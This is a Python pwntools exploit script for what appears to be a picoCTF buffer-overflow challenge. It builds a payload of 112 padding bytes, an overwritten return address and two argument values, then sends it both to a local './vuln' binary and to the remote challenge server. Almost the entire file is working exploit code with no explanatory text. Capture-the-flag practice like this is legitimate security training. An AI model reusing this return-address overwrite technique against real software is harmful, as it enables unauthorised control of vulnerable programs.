#!/usr/bin/env python3
import sys
from pwn import *

#96 92 04 08  00 00 00 00  0d f0 fe ca  0d f0 0d f0
jnk = b'\x41' * 112
eip = b'\x96\x92\x04\x08'    # 804929a
ret = b'\x43' * 4
arg1 = b'\x0D\xF0\xFE\xCA'
arg2 = b'\x0D\xF0\x0D\xF0'

payload = jnk + eip + ret + arg1 + arg2

#context.update(arch='i386', os='linux')
p = process('./vuln')
#gdb.attach(p)
#print(p.recvline())
#p.sendline(payload)
#p.interactive()
#p.close()

c = remote('saturn.picoctf.net', 54486)
print(c.recvline())
c.sendline(payload)
c.interactive()
#c.close()
